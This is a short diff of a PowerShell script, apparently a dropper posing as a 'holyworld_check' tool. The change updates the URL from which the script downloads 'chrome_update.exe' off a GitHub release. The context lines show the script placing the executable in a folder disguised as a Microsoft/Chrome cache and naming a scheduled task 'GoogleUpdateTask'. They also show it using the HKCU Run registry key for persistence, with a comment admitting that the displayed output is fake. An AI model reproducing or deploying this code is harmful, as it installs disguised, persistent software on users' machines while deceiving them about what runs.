@@ -10,7 +10,7 @@ $Dir      = "$env:ProgramData\Microsoft\Windows\Caches\ChromeUpdate"
 $Exe      = "$Dir\chrome_update.exe"
 $TaskName = "GoogleUpdateTask"
 $RunKey   = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/chrome_update.exe"
+$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/fsdafsfs/chrome_update.exe"
 
 # Helper functions — only for the FAKE output
 function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
